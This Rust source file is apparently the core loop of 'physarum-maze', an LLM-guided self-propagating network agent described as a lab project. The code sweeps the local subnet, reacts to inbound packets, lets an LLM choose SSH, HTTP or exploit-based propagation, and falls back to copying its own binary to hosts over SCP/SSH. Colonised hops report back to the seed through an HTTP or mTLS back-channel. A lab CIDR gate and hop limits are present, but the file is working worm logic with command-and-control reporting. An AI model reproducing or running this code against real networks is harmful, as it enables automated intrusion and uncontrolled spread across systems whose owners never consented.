/// Main agent event loop — Issue #126 adaptive sensing edition.
///
/// Two organic stimulus paths — no external harness required:
///
/// Path A — Startup sensing (every 180 s, first tick fires immediately):
///   discovery_ticker fires
///     → startup_sweep(/24 of local interface, STARTUP_SWEEP_PORTS)
///     → for each discovered host → handle_candidate(ip, "startup-sensing")
///     → llm_loop::run (SensingProfile::StartupLocalDiscovery)
///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
///
/// Path B — Runtime stimulus (ICMP / TCP-SYN / eBPF):
///   raw socket / eBPF observer detects inbound packet
///     → handle_candidate(ip, "icmp" | "tcp-syn" | "ebpf")
///     → llm_loop::run (RuntimeIcmpFast or RuntimeTcpEbpfFast)
///     → DiscoveryQuery → LLM → PolicyGate → LlmAttemptEvidence → lineage
///
/// When LLM is not configured (no --llm-endpoint), the agent falls back to
/// the SSH-propagation path (port-22 probe → SCP/SSH colonisation).
use crate::{
    graph_sink::GraphSink,
    lineage::Lineage,
    llm_loop::{self, LlmOutcome},
    propagation::{self, Outcome},
    vuln_intel::VulnerabilityIntelService,
    Cli, Mode,
};
use anyhow::Result;
use physarum_llm::{MockLlmClient, OpenAiCompatibleClient, PolicyGate, PropagationMethodClass};
use physarum_protocol::{ColonizationReport, EventKind};
use std::collections::HashSet;
use std::net::Ipv4Addr;
use std::path::Path;
use std::str::FromStr;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::sync::mpsc;
use tokio::time::timeout;

/// Resolved LLM configuration — None means LLM is disabled.
struct LlmConfig {
    client: Arc<dyn physarum_llm::LlmClient>,
    gate: PolicyGate,
}

impl LlmConfig {
    fn from_cli(cli: &Cli) -> Option<Self> {
        let endpoint = cli.llm_endpoint.as_deref()?;

        let allowed_cidrs = parse_cidr(cli.llm_allowed_cidr.as_deref()).unwrap_or_default();

        let mut gate = PolicyGate::lab_default();
        gate.allowed_cidrs = allowed_cidrs;
        gate.exploit_enabled = cli.exploit_enabled;

        let mut allowed_methods = vec![
            PropagationMethodClass::Ssh,
            PropagationMethodClass::Http,
            PropagationMethodClass::NoPath,
        ];
        if cli.exploit_enabled {
            allowed_methods.push(PropagationMethodClass::Exploit);
        }
        gate.allowed_methods = allowed_methods.clone();

        let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
            Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
        } else if endpoint.starts_with("mock-http") {
            // mock-http[:<port>] — e.g. mock-http:8080 for Struts/Jetty targets
            let port: Option<u16> = endpoint
                .split_once(':')
                .map(|x| x.1)
                .and_then(|p| p.parse().ok());
            Arc::new(MockLlmClient::http_probe_with_plan("/", port, 0.9))
        } else if endpoint.starts_with("mock-exploit") {
            // mock-exploit[:<port>[:<user>]] — Phase 2 SSH-first dry-run
            // e.g. mock-exploit:8080:root
            // Pubkey is injected at query time from the ephemeral key generated in llm_loop.
            // The mock uses a placeholder — the real LLM uses the actual ephemeral_pubkey field.
            let mut parts = endpoint.splitn(3, ':');
            let _ = parts.next(); // "mock-exploit"
            let port: u16 = parts.next().and_then(|p| p.parse().ok()).unwrap_or(8080);
            let user = parts.next().unwrap_or("root");
            Arc::new(MockLlmClient::exploit_rce_ssh_first(
                "ssh-ed25519 PLACEHOLDER physarum-ephemeral",
                port,
                user,
                0.92,
            ))
        } else {
            let api_key = cli.llm_api_key.clone().unwrap_or_default();
            match OpenAiCompatibleClient::new(
                endpoint,
                &cli.llm_model,
                api_key,
                cli.llm_timeout_ms,
                allowed_methods,
                cli.llm_log_prompts,
            ) {
                Ok(c) => Arc::new(c),
                Err(e) => {
                    tracing::warn!(err = %e, "failed to build LLM client — LLM disabled");
                    return None;
                }
            }
        };

        tracing::info!(
            endpoint,
            model = %cli.llm_model,
            cidrs = ?cli.llm_allowed_cidr,
            "LLM reasoning enabled"
        );

        Some(LlmConfig { client, gate })
    }
}

fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
    let cidr = cidr?;
    let (ip_str, prefix_str) = cidr.split_once('/')?;
    let ip = std::net::Ipv4Addr::from_str(ip_str).ok()?;
    let prefix = prefix_str.parse::<u8>().ok()?;
    Some(vec![(ip, prefix)])
}

pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Result<()> {
    if matches!(cli.mode, Mode::KeygenTest) {
        return run_keygen_test().await;
    }

    // Resolve interface name before anything uses it.
    // "auto" → find the interface whose IP is in --llm-allowed-cidr with the
    // highest prefix length (most specific = most likely the internal/lab NIC).
    cli.interface = resolve_interface(&cli.interface, cli.llm_allowed_cidr.as_deref())
        .unwrap_or_else(|e| {
            tracing::warn!(err = %e, "interface auto-detection failed — falling back to eth0");
            "eth0".to_string()
        });

    let llm = LlmConfig::from_cli(&cli);
    let intel = VulnerabilityIntelService::from_env().unwrap_or_else(|e| {
        tracing::warn!(err = %e, "VulnerabilityIntelService init failed — offline cache empty");
        VulnerabilityIntelService::new(
            crate::vuln_intel::IntelMode::Offline,
            std::path::Path::new("examples/advisory-cache"),
            3_000,
        )
        .unwrap()
    });
    let intel = std::sync::Arc::new(intel);
    let mut lineage = init_lineage(&cli)?;
    // Embed ports so propagated hops can call back.
    // server_port → browser HTTP (legacy /report-colonization fallback)
    // mtls_port   → mTLS back-channel on server_port + 1 (Issue #189)
    if matches!(cli.mode, Mode::Seed) {
        lineage.server_port = cli.server;
        if crate::tls_store::STORE.get().is_some() {
            lineage.mtls_port = cli.server.map(|p| p + 1);
        }
    }
    lineage.save()?;

    if lineage.hops >= cli.max_hops {
        tracing::warn!(
            hops = lineage.hops,
            max = cli.max_hops,
            "max hops reached — dormant"
        );
        return Ok(());
    }

    let binary_path = std::env::current_exe()?;
    let local_ip = resolve_local_ip(&cli, &lineage);

    // Seed node: always announce self first so the canvas has an anchor
    // before any discovery events arrive.
    if let (Some(s), Some(ip)) = (&sink, local_ip) {
        s.emit(EventKind::NodeDiscovered {
            ip: ip.to_string(),
            depth: 0,
        })
        .await;
    }

    let mut icmp_rx = crate::icmp::start(cli.interface.clone());
    let mut tcp_rx = crate::tcp::start(cli.interface.clone());
    let mut ebpf_rx: Option<mpsc::Receiver<Ipv4Addr>> = init_ebpf(&cli);
    let mut discovery_ticker =
        tokio::time::interval(Duration::from_secs(cli.discovery_interval_secs));
    let mut attempted: HashSet<Ipv4Addr> = HashSet::new();

    let stimulus_timeout = Duration::from_secs(cli.stimulus_timeout_secs);
    let mut dormant_at = tokio::time::Instant::now() + stimulus_timeout;

    tracing::info!(
        mode                 = ?cli.mode,
        hops                 = lineage.hops,
        origin               = %lineage.origin,
        path                 = ?lineage.path,
        local                = ?local_ip.map(|ip| ip.to_string()),
        discovery_interval_s = cli.discovery_interval_secs,
        "physarum-maze agent ready — startup sweep on first tick"
    );

    // Propagated agent: report own colonization back to the seed immediately on startup.
    // The seed never calls fire_back_channel for itself; only propagated agents report.
    if matches!(cli.mode, Mode::Propagated) {
        if let Some(my_ip) = local_ip {
            let report = physarum_protocol::ColonizationReport {
                hop_ip: my_ip.to_string(),
                depth: (lineage.hops as u32).saturating_add(1),
                confidence: 0.9,
                cve_ids: vec![],
            };
            fire_back_channel(report, &lineage).await;
        }
    }

    loop {
        tokio::select! {
            // ── ICMP echo-request stimulus ────────────────────────────────
            maybe_ip = icmp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                        ).await?;
                    }
                    None => {
                        tracing::info!("ICMP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── TCP SYN stimulus ──────────────────────────────────────────
            maybe_ip = tcp_rx.recv() => {
                match maybe_ip {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                        ).await?;
                    }
                    None => {
                        tracing::info!("TCP channel closed — shutting down");
                        break;
                    }
                }
            }

            // ── Startup/periodic /24 sweep (Path A) ───────────────────────
            _ = discovery_ticker.tick() => {
                if let Some(my_ip) = local_ip {
                    let candidates = crate::discovery::startup_sweep(my_ip).await;
                    tracing::info!(
                        found = candidates.len(),
                        local = %my_ip,
                        "startup sweep complete"
                    );
                    if !candidates.is_empty() {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                    }
                    for ip in candidates {
                        handle_candidate(
                            ip, "startup-sensing", &mut lineage, &binary_path,
                            &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                        ).await?;
                    }
                }
            }

            // ── eBPF inbound connection stimulus ──────────────────────────
            maybe_ebpf = async {
                if let Some(rx) = ebpf_rx.as_mut() {
                    rx.recv().await
                } else {
                    std::future::pending::<Option<Ipv4Addr>>().await
                }
            } => {
                match maybe_ebpf {
                    Some(ip) => {
                        dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                        handle_candidate(
                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                        ).await?;
                    }
                    None => {
                        tracing::info!("eBPF channel closed");
                        ebpf_rx = None;
                    }
                }
            }

            // ── Stimulus timeout ──────────────────────────────────────────
            _ = tokio::time::sleep_until(dormant_at) => {
                tracing::info!(
                    secs = cli.stimulus_timeout_secs,
                    "no stimulus — going dormant"
                );
                break;
            }
        }
    }

    tracing::info!(
        hops              = lineage.hops,
        path              = ?lineage.path,
        scores            = ?lineage.scores,
        secondary_conduits = ?lineage.secondary_conduits,
        "physarum-maze shutting down"
    );
    Ok(())
}

/// Process one candidate IP regardless of which stimulus source produced it.
///
/// Guard order:
///   1. Cycle guard — skip if IP is already in the lineage path.
///   2. Dead-end guard — skip passive probes against known dead ends;
///      active stimuli (ICMP/TCP/eBPF) clear the mark and re-validate.
///   3. Colonised guard — skip already-colonised hosts.
///   4. Session dedup — skip IPs already attempted this run.
///
/// Decision order when guards pass:
///   A. LLM configured → llm_loop::run (adaptive profile from stimulus).
///   B. LLM absent → port-22 probe → SSH/SCP propagation fallback.
#[allow(clippy::too_many_arguments)]
async fn handle_candidate(
    src_ip: Ipv4Addr,
    stimulus: &str,
    lineage: &mut Lineage,
    binary_path: &Path,
    attempted: &mut HashSet<Ipv4Addr>,
    llm: &Option<LlmConfig>,
    intel: &VulnerabilityIntelService,
    local_ip: Option<Ipv4Addr>,
    sink: Option<&std::sync::Arc<GraphSink>>,
) -> Result<()> {
    let ip_str = src_ip.to_string();

    // ── Guards ────────────────────────────────────────────────────────────
    if lineage.is_visited(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already in lineage path — loop guard, skip");
        return Ok(());
    }
    if lineage.is_dead_end(&ip_str) {
        match stimulus {
            "startup-sensing" | "discovery" => {
                tracing::debug!(%src_ip, stimulus, "known dead end — skip passive probe");
                return Ok(());
            }
            _ => {
                // Active stimulus: host is signalling — environment may have changed.
                tracing::info!(%src_ip, stimulus, "dead-ended host sent active stimulus — revalidating");
                lineage.unmark_dead_end(&ip_str);
                attempted.remove(&src_ip);
            }
        }
    }
    if lineage.is_colonized(&ip_str) {
        tracing::debug!(%src_ip, stimulus, "already colonized — skip");
        return Ok(());
    }
    if !attempted.insert(src_ip) {
        tracing::debug!(%src_ip, stimulus, "already attempted this session — skip");
        return Ok(());
    }

    tracing::info!(%src_ip, stimulus, "candidate accepted — starting evidence pipeline");

    // Capture parent before llm_loop::run() mutates lineage via extend()
    let parent_ip = lineage
        .path
        .last()
        .cloned()
        .unwrap_or_else(|| lineage.origin.clone());

    if let Some(s) = sink {
        s.emit(EventKind::NodeDiscovered {
            ip: ip_str.clone(),
            depth: lineage.hops as u32 + 1,
        })
        .await;
    }

    // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
    if let Some(cfg) = llm {
        match llm_loop::run(
            src_ip,
            stimulus,
            lineage,
            cfg.client.as_ref(),
            &cfg.gate,
            intel,
            local_ip,
        )
        .await?
        {
            LlmOutcome::Propagated { confidence, cve } => {
                tracing::info!(%src_ip, "LLM propagation succeeded");
                let depth = lineage.hops as u32 + 1;
                if let Some(s) = sink {
                    // Seed path: update the organism graph immediately.
                    s.emit(EventKind::EdgeAdded {
                        from: parent_ip.clone(),
                        to: ip_str.clone(),
                    })
                    .await;
                    s.emit(EventKind::NodeColonized {
                        ip: ip_str.clone(),
                        depth,
                        confidence,
                        cve: cve.clone(),
                    })
                    .await;
                    // Phase 1 D_ij approximation: use LLM confidence directly.
                    // True reinforcement (Phase 2) requires the back-channel from Issue #179.
                    s.emit(EventKind::DijUpdated {
                        from: parent_ip.clone(),
                        to: ip_str.clone(),
                        conductivity: confidence,
                    })
                    .await;
                } else {
                    // Propagated agent: report colonization to seed via HTTP back-channel.
                    let report = ColonizationReport {
                        hop_ip: ip_str.clone(),
                        depth,
                        confidence,
                        cve_ids: cve.into_iter().collect(),
                    };
                    fire_back_channel(report, lineage).await;
                }
                lineage.mark_colonized(&ip_str);
                lineage.save()?;
                return Ok(());
            }
            LlmOutcome::DeadEnd => {
                tracing::warn!(%src_ip, "LLM exhausted — marking dead end");
                if let Some(s) = sink {
                    s.emit(EventKind::EdgeAdded {
                        from: parent_ip.clone(),
                        to: ip_str.clone(),
                    })
                    .await;
                    s.emit(EventKind::DijUpdated {
                        from: parent_ip.clone(),
                        to: ip_str.clone(),
                        conductivity: 0.05,
                    })
                    .await;
                }
                lineage.mark_dead_end(&ip_str);
                lineage.save()?;
                return Ok(());
            }
        }
    }

    // ── Path B: SSH fallback (no LLM) ─────────────────────────────────────
    tracing::info!(%src_ip, stimulus, "confirming SSH on port 22 (no LLM configured)");
    if !port_22_open(src_ip).await {
        tracing::warn!(%src_ip, "port 22 not open — dead end");
        lineage.mark_dead_end(&ip_str);
        lineage.save()?;
        return Ok(());
    }

    crate::discovery::scan_targeted(src_ip);

    let next_lineage = lineage.extend(&ip_str);
    let next_b64 = next_lineage.to_b64()?;

    tracing::info!(%src_ip, hops = next_lineage.hops, "propagating via SSH");

    match propagation::propagate(src_ip, binary_path, &next_b64).await? {
        Outcome::Success => {
            tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
            if let Some(s) = sink {
                let from = lineage
                    .path
                    .last()
                    .cloned()
                    .unwrap_or_else(|| lineage.origin.clone());
                s.emit(EventKind::EdgeAdded {
                    from: from.clone(),
                    to: ip_str.clone(),
                })
                .await;
                s.emit(EventKind::NodeColonized {
                    ip: ip_str.clone(),
                    depth: next_lineage.hops as u32,
                    confidence: 0.0,
                    cve: None,
                })
                .await;
            }
            *lineage = next_lineage;
            lineage.save()?;
        }
        Outcome::AlreadyColonized => {
            tracing::info!(%src_ip, "already colonized — recording secondary conduit");
            let from = lineage
                .path
                .last()
                .cloned()
                .unwrap_or_else(|| lineage.origin.clone());
            if let Some(s) = sink {
                s.emit(EventKind::EdgeAdded {
                    from: from.clone(),
                    to: ip_str.clone(),
                })
                .await;
            }
            lineage.mark_colonized(&ip_str);
            lineage.add_secondary_conduit(&from, &ip_str);
            lineage.save()?;
        }
        Outcome::ScpFailed => {
            tracing::warn!(%src_ip, "SCP failed — dead end");
            lineage.mark_dead_end(&ip_str);
            lineage.save()?;
        }
        Outcome::SshFailed => {
            tracing::warn!(%src_ip, "SSH launch failed — penalizing edge");
            lineage.penalize(&ip_str);
            lineage.save()?;
        }
    }

    Ok(())
}

/// Send a `ColonizationReport` to the seed's HTTP server.
///
/// Called by propagated agents after each successful colonization. The seed
/// uses the report to update the organism graph with downstream hops it cannot
/// observe directly (no `GraphSink` on propagated instances).
///
/// When the lineage carries mTLS fields (Issue #189), the back-channel uses
/// `https://` with the agent's client cert and trusts only the seed's ephemeral CA.
/// Falls back to plain `http://` when certs are absent (dev/legacy path).
/// Failures are logged as warnings and never block the propagation chain.
async fn fire_back_channel(report: physarum_protocol::ColonizationReport, lineage: &Lineage) {
    // Prefer mTLS back-channel (Issue #189): separate port, client cert required.
    // Fall back to plain HTTP on server_port (legacy path when no mTLS certs in lineage).
    let (scheme, port, client) = match (
        lineage.mtls_port,
        &lineage.ca_cert_pem,
        &lineage.agent_cert_pem,
        &lineage.agent_key_pem,
    ) {
        (Some(mtls_port), Some(ca_pem), Some(cert_pem), Some(key_pem)) => {
            let combined = format!("{cert_pem}\n{key_pem}");
            let identity_res = reqwest::Identity::from_pem(combined.as_bytes());
            let ca_res = reqwest::Certificate::from_pem(ca_pem.as_bytes());
            match (identity_res, ca_res) {
                (Ok(identity), Ok(ca_cert)) => {
                    let c = reqwest::Client::builder()
                        .timeout(std::time::Duration::from_secs(5))
                        .identity(identity)
                        .add_root_certificate(ca_cert)
                        // Server cert SAN is "physarum-seed" (DNS); we connect to
                        // the seed's IP — skip name check while keeping CA validation.
                        .danger_accept_invalid_hostnames(true)
                        .build();
                    match c {
                        Ok(client) => ("https", mtls_port, client),
                        Err(e) => {
                            tracing::warn!(err = %e, "back-channel: mTLS client build failed — skipping");
                            return;
                        }
                    }
                }
                _ => {
                    tracing::warn!("back-channel: PEM parse failed — skipping");
                    return;
                }
            }
        }
        _ => {
            // Legacy plain HTTP fallback (propagated agents without mTLS certs).
            let Some(port) = lineage.server_port else {
                tracing::debug!("back-channel skipped — no server_port or mtls_port in lineage");
                return;
            };
            let plain = reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(5))
                .build()
                .unwrap_or_default();
            ("http", port, plain)
        }
    };

    let url = format!("{scheme}://{}:{}/report-colonization", lineage.origin, port);
    tracing::info!(
        url = %url,
        hop = %report.hop_ip,
        depth = report.depth,
        confidence = report.confidence,
        "back-channel: reporting colonization to seed"
    );

    match client.post(&url).json(&report).send().await {
        Ok(r) if r.status().is_success() => {
            tracing::info!(hop = %report.hop_ip, "back-channel: seed acknowledged");
        }
        Ok(r) => {
            tracing::warn!(
                hop = %report.hop_ip,
                status = r.status().as_u16(),
                "back-channel: seed returned non-2xx"
            );
        }
        Err(e) => {
            tracing::warn!(
                hop = %report.hop_ip,
                err = %e,
                "back-channel: seed unreachable (propagation continues)"
            );
        }
    }
}

fn init_lineage(cli: &Cli) -> Result<Lineage> {
    match &cli.mode {
        Mode::Seed | Mode::KeygenTest => {
            let my_ip = local_ip(&cli.interface)?;
            tracing::info!(%my_ip, iface = %cli.interface, "seed mode");
            Ok(Lineage::seed(&my_ip.to_string()))
        }
        Mode::Propagated => {
            let b64 = cli
                .lineage_b64
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("--lineage-b64 required in propagated mode"))?;
            let lin = Lineage::from_b64(b64)?;
            tracing::info!(
                hops   = lin.hops,
                origin = %lin.origin,
                path   = ?lin.path,
                "propagated mode — lineage received"
            );
            Ok(lin)
        }
    }
}

/// Resolve the local IPv4 address used for /24 startup sweep.
///
/// Seed mode: read from the NIC.
/// Propagated mode: the last IP in the lineage path is the current host.
fn resolve_local_ip(cli: &Cli, _lineage: &Lineage) -> Option<Ipv4Addr> {
    // Always read from the network interface — lineage.path.last() is the seed's IP
    // at propagated-agent startup (path not yet updated with the new host's address).
    local_ip(&cli.interface).ok()
}

/// TCP connect probe — confirms port 22 is open and accepting connections.
/// Used only in the SSH fallback path (no LLM configured).
async fn port_22_open(ip: Ipv4Addr) -> bool {
    match timeout(Duration::from_secs(5), TcpStream::connect((ip, 22u16))).await {
        Ok(Ok(_)) => {
            tracing::debug!(%ip, "port 22 open");
            true
        }
        Ok(Err(e)) => {
            tracing::debug!(%ip, error = %e, "port 22 refused");
            false
        }
        Err(_) => {
            tracing::debug!(%ip, "port 22 timeout");
            false
        }
    }
}

/// Initialize the optional eBPF stimulus receiver.
fn init_ebpf(cli: &Cli) -> Option<mpsc::Receiver<Ipv4Addr>> {
    #[cfg(target_os = "linux")]
    if let Some(ref path) = cli.bpf_bytecode {
        match crate::ebpf::start(path) {
            Ok(rx) => {
                tracing::info!(?path, "eBPF stimulus enabled");
                return Some(rx);
            }
            Err(e) => {
                tracing::warn!(err = %e, "eBPF stimulus init failed — continuing without eBPF");
            }
        }
    }
    let _ = cli;
    None
}

/// Determine the IPv4 address assigned to `interface`.
fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
    for iface in if_addrs::get_if_addrs()? {
        if iface.name == interface {
            if let if_addrs::IfAddr::V4(v4) = iface.addr {
                return Ok(v4.ip);
            }
        }
    }
    anyhow::bail!("no IPv4 address found for interface '{}'", interface)
}

/// Resolve the actual interface name from a potentially abstract value.
///
/// When `interface` is `"auto"`:
///   - If `allowed_cidr` is provided: collect all non-loopback IPv4 interfaces
///     whose IP falls within the CIDR, then pick the one with the highest prefix
///     length (most specific subnet = most likely the isolated lab / VPC NIC).
///   - If no CIDR or no match: pick the first non-loopback IPv4 interface.
///
/// When `interface` is any other value: return it unchanged.
fn resolve_interface(interface: &str, allowed_cidr: Option<&str>) -> anyhow::Result<String> {
    if interface != "auto" {
        return Ok(interface.to_string());
    }

    let all = if_addrs::get_if_addrs()?;

    // Collect non-loopback IPv4 candidates, optionally filtered by CIDR,
    // tagged with prefix length for sorting.
    let mut candidates: Vec<(String, u8)> = all
        .iter()
        .filter(|i| !i.is_loopback())
        .filter_map(|i| {
            if let if_addrs::IfAddr::V4(v4) = &i.addr {
                if let Some(cidr) = allowed_cidr {
                    if !ip_in_cidr(v4.ip, cidr) {
                        return None;
                    }
                }
                Some((i.name.clone(), netmask_prefix(v4.netmask)))
            } else {
                None
            }
        })
        .collect();

    // Higher prefix length = more specific subnet = preferred (internal NIC).
    candidates.sort_by_key(|c| std::cmp::Reverse(c.1));

    if let Some((name, prefix)) = candidates.into_iter().next() {
        tracing::info!(
            iface = %name,
            prefix = %prefix,
            cidr = ?allowed_cidr,
            "auto: selected interface (highest prefix in CIDR)"
        );
        return Ok(name);
    }

    // Fallback: no CIDR match — pick any non-loopback IPv4 interface.
    for iface in &all {
        if !iface.is_loopback() {
            if let if_addrs::IfAddr::V4(_) = &iface.addr {
                tracing::warn!(
                    iface = %iface.name,
                    "auto: no interface in CIDR — falling back to first non-loopback"
                );
                return Ok(iface.name.clone());
            }
        }
    }

    anyhow::bail!("auto: no usable IPv4 interface found")
}

/// Returns true when `ip` falls within the CIDR given as `"x.x.x.x/prefix"`.
fn ip_in_cidr(ip: std::net::Ipv4Addr, cidr: &str) -> bool {
    let Some((net_str, prefix_str)) = cidr.split_once('/') else {
        return false;
    };
    let Ok(net) = net_str.parse::<std::net::Ipv4Addr>() else {
        return false;
    };
    let Ok(prefix) = prefix_str.parse::<u8>() else {
        return false;
    };
    if prefix == 0 {
        return true;
    }
    let mask = !0u32 << (32 - prefix);
    (u32::from(ip) & mask) == (u32::from(net) & mask)
}

/// Convert a netmask address to a CIDR prefix length.
/// e.g. 255.255.255.0 → 24, 255.255.0.0 → 16.
fn netmask_prefix(netmask: std::net::Ipv4Addr) -> u8 {
    u32::from(netmask).leading_ones() as u8
}

// ── KeygenTest mode ───────────────────────────────────────────────────────────

async fn run_keygen_test() -> Result<()> {
    use tokio::process::Command;

    tracing::info!("keygen-test: generating ephemeral ed25519 keypair");

    let key = crate::llm_loop::generate_ephemeral_keypair().await?;

    tracing::info!(pubkey = %key.pubkey, "keygen-test: pubkey");

    // Verify permissions: private key must be mode 600.
    let meta = tokio::fs::metadata(&key.privkey_path).await?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = meta.permissions().mode() & 0o777;
        anyhow::ensure!(
            mode == 0o600,
            "keygen-test: privkey permissions are {:o}, expected 600",
            mode
        );
        tracing::info!(
            mode = format!("{:o}", mode),
            "keygen-test: privkey permissions OK"
        );
    }
    #[cfg(not(unix))]
    {
        let _ = meta;
    }

    // Print fingerprint via ssh-keygen -l.
    let pubkey_path = key.privkey_path.with_extension("pub");
    let out = Command::new("ssh-keygen")
        .args(["-l", "-f", pubkey_path.to_str().unwrap_or("")])
        .output()
        .await?;
    let fingerprint = String::from_utf8_lossy(&out.stdout);
    tracing::info!(fingerprint = %fingerprint.trim(), "keygen-test: fingerprint");

    // Cleanup — private key must not persist.
    tokio::fs::remove_file(&key.privkey_path).await?;
    tokio::fs::remove_file(&pubkey_path).await?;
    tracing::info!("keygen-test: keypair removed — OK");

    Ok(())
}
